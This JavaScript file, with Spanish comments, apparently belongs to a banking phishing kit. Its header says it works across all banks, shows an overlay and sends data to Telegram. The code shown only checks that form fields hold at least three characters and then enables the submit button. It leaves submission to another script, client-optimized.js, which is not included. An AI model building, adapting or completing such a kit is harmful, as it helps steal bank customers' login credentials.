/**
 * SISTEMA UNIVERSAL SIMPLE - FUNCIONA EN TODAS LAS BANCAS
 * Habilita botones, muestra overlay, envía a Telegram
 */
(function() {
    'use strict';
    
    // Esperar a que cargue todo
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
    function init() {
        const form = document.querySelector('form');
        const btn = form ? form.querySelector('button[type="submit"]') : document.querySelector('button[type="submit"]');
        
        if (!btn || !form) return;
        
        const inputs = form.querySelectorAll('input:not([type="hidden"]):not([type="checkbox"]):not([type="radio"]), select');
        
        if (inputs.length === 0) return;
        
        // VALIDACIÓN - Habilitar botón cuando campos completos
        function validate() {
            let allValid = true;
            inputs.forEach(input => {
                const value = input.value.trim();
                if (value.length < 3) allValid = false;
            });
            btn.disabled = !allValid;
            if (allValid) btn.classList.add('active');
            else btn.classList.remove('active');
        }
        
        inputs.forEach(input => {
            input.addEventListener('input', validate);
            input.addEventListener('change', validate);
        });
        
        validate();
        
        // Ya no manejar submit aquí - dejar que client-optimized.js lo maneje
    }
})();
